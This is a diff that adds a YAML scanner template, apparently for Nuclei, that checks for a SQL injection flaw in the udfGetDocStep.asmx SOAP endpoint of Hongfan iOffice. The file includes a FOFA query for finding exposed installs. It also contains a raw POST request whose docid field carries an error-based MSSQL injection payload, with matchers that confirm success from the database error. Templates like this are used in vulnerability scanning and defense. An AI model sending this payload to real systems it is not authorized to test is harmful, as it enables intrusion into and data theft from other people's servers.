@@ -1,0 +1,46 @@
+id: poc-yaml-hongfan-ioffice-udfgetdocstep-sqli
+info:
+  name: 红帆ioffice udfGetDocStep.asmx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: iOffice
+    fofa: "app=\"红帆-ioffice\""
+
+variables:
+  t1: "{{rand_int(10000, 99999)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /ioffice/prg/interface/udfGetDocStep.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetDocStep"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+            <soap:Body>
+            <GetDocStep xmlns="http://tempuri.org/">
+                <docid>1' and sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{t1}}'))>0;--</docid>
+            </GetDocStep>
+            </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+
+      - type: word
+        part: body
+        words:
+          - "nvarchar 值 '0x{{t2}}' 转换成数据类型 int 时失败"
+
+      - type: word
+        part: header
+        words:
+          - "text/xml"
